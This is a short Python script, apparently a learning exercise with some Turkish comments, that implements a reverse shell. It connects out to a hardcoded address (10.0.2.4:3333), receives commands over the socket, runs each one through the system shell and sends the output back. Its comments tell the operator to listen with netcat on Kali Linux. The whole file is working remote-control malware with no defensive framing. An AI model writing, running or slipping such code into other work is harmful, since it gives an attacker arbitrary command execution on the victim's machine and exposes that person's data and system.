import socket
import subprocess

# target machine is kali linux and for controlling 
# type 'nc -l -p PORT_NUMBER' on terminal on kali linux 
# PORT_NUMBER is that we used 3333

# socket.socket(1,2)
# 1. hangi ag ailesi ile calisilacak.
# 2. hangi yol ile veriler transfer edilecek.
class MySocket:
	def __init__(self, ip, port):
		self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.my_connection.connect((ip, port))
		# my_connection.send("connected OK for windows\n")
	
	def command_execution(self, command) :
		# run command with shell
		return subprocess.check_output(command, shell=True)

	def start_socket(self):
		while True:
			# will be received '1024 byte' data 
			command = self.my_connection.recv(1024)
			command_output = self.command_execution(command)
			self.my_connection.send(command_output)
		
		self.my_connection.close()

my_socket_object = MySocket("10.0.2.4",3333)
my_socket_object.start_socket()